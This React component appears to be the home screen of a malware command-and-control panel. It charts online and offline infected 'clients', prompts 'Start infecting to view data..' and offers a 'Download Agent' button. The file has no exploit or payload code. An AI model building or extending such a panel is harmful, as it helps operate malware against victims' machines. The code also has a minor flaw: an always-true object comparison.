import Title from '../Title/Title'
import React, {useEffect, useState} from "react";
import {downloadAgent, getStatistics} from "../../api/api";
import {Spinner} from "reactstrap";
import styled from '@emotion/styled';
import {makeSelectUser} from "../../redux/selectors/userSelector";
import {createSelector} from "reselect";
import {useSelector} from "react-redux";
import DoughnutChart from './Graphs/DoughnutChart'
import BarChart from "./Graphs/BarChart";

const stateSelector = createSelector(makeSelectUser, (user) => ({
    user
}))

const Home = () => {
    const {user} = useSelector(stateSelector)
    const [allStatistics, setAllStatistics] = useState({})

    useEffect(() => {
        let handle = setInterval(clientsStatistics, 2000);
        return () => {
            setAllStatistics(false)
            clearInterval(handle);
        };
    }, []);

    const renderCharts = () => {
        if (allStatistics !== {}) {
            if ((allStatistics?.onlineClients > 0) || (allStatistics?.offlineClients > 0)) { // there is data to display
                return (
                    <>
                        <DoughnutChart stats={allStatistics}/>
                        <BarChart stats={allStatistics}/>
                    </>
                )
            } else { // no data to display, show text box
                return (
                    <div>
                        <NoDataMessage>Start infecting to view data..</NoDataMessage>
                        <Spinner actions={"border"} color={"success"} type="grow"/>
                    </div>
                )
            }
        } else {
            return (<Spinner actions={"border"} color={"success"} type="grow"/>)
        }
    }

    function clientsStatistics() {
        getStatistics().then((data) => {
            setAllStatistics(data.data)
        }).catch(() => setAllStatistics(null))
    }

    return (
        <HomePageWrapper className="homePageWrapper">
            <Title text1="WELCOME" text2={user.username.toUpperCase()} open={true}/>
            <ChartsWrapper>
                {renderCharts()}
            </ChartsWrapper>
            {/*<button className="button" onClick={(e) => downloadAgent(e)}>Download Agent</button>*/}
            <DownloadAgentButton
                value="Download Agent"
                type="button" onClick={(e) => downloadAgent(e)}>Download Agent
            </DownloadAgentButton>
        </HomePageWrapper>

    )
}
export default Home;


const HomePageWrapper = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
`

const NoDataMessage = styled.h3`
  color: black;
  margin: 2em auto;
  background: #98d14a;
  padding: 0.3em;
  border-radius: 5px;
`

const ChartsWrapper = styled.div`
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
`

const DownloadAgentButton = styled.button`
  width: 10em;
  padding: 0.5em;
  border-radius: 5px;
  border: none;
  font-size: 1.25em;
  background-color: rgba(153, 209, 75, 0.8);
`